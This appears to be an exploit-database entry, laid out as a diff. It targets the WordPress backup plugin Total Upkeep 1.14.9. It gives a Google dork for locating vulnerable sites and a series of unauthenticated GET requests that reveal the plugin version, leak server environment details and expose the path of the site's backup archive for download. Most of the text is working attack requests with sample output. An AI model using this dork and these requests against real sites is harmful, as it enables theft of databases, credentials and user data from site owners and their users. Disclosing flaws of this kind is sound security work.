@@ -1,0 +1,36 @@
+# Exploit Title: WordPress Plugin Total Upkeep 1.14.9 - Database and Files Backup Download
+# Google Dork: intitle:("Index of" AND "wp-content/plugins/boldgrid-backup/=")
+# Date: 2020-12-12
+# Exploit Author: Wadeek
+# Vendor Homepage: https://www.boldgrid.com/
+# Software Link: https://downloads.wordpress.org/plugin/boldgrid-backup.1.14.9.zip
+# Version: 1.14.9
+# Tested on: BackBox Linux
+
+1) 'readme.txt' file reveal the plugin version :
+-> GET /wp-content/plugins/boldgrid-backup/readme.txt
+Stable tag: 1.14.9
+
+2) 'env-info.php' file reveals the following informations without authentication :
+-> GET /wp-content/plugins/boldgrid-backup/cli/env-info.php
+{
+    [...],
+    "php_uname":"Linux wordpress-server X.X.X-XX-generic #XX-Ubuntu [...] x=
+86_64",
+    "php_version":"7.X.X",
+    "server_addr":"127.0.0.1",
+    "server_name":"www.example.com",
+    "server_protocol":"HTTP/1.1",
+    "server_software":"Apache/2.X.XX (Ubuntu)",
+    "uid":XX,
+    "username":"www-data"
+}
+
+3) 'restore-info.json' file reveals the name and location of the archive containing the backups without authentication :
+-> GET /wp-content/plugins/boldgrid-backup/cron/restore-info.json
+{
+    [...]
+    "filepath":"/wp-content/boldgrid_backup_[RANDOM]/boldgrid-backup-www.example.com_wordpress-[RANDOM]-[DATE]-XXXXXX.zip"
+    [...]
+}
+--trekuen-71b82944-04b2-40f7-b2e2-d8de1b7f2bb8--
